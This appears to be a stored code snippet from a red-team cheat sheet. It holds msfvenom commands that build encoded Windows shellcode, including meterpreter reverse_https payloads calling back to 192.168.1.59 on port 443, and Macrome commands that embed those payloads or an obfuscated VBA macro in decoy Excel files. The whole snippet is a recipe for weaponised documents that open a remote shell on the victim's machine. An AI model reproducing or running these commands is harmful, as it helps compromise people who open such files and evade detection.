---
id: 87fc998a-8c0b-43c9-bff8-319964c3bc40
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:23.232508+00:00'
updated_at: '2023-04-10T20:36:50.023149+00:00'
---

# Code Snippet 87fc998a

**Language**: ps1

```ps1
# NOTE: The payload cannot contains NULL bytes.

# Default calc
msfvenom -a x86 -b '\x00' --platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f raw EXITFUNC=thread > popcalc.bin
msfvenom -a x64 -b '\x00' --platform windows -p windows/x64/exec cmd=calc.exe -e x64/xor -f raw EXITFUNC=thread > popcalc64.bin
# Custom shellcode
msfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-86.bin -b '\x00'
msfvenom -p generic/custom PAYLOADFILE=payload64.bin -a x64 --platform windows -e x64/xor_dynamic -f raw -o shellcode-64.bin -b '\x00'
# MSF shellcode
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.59 LPORT=443 -b '\x00'  -a x64 --platform windows -e x64/xor_dynamic --platform windows -f raw -o msf64.bin
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.59 LPORT=443 -b '\x00' -a x86 --encoder x86/shikata_ga_nai --platform windows -f raw -o msf86.bin

dotnet Macrome.dll build --decoy-document decoy_document.xls --payload popcalc.bin --payload64-bit popcalc64.bin
dotnet Macrome.dll build --decoy-document decoy_document.xls --payload shellcode-86.bin --payload64-bit shellcode-64.bin

# For VBA Macro
Macrome build --decoy-document decoy_document.xls --payload-type Macro --payload macro_example.txt --output-file-name xor_obfuscated_macro_doc.xls --password VelvetSweatshop
```


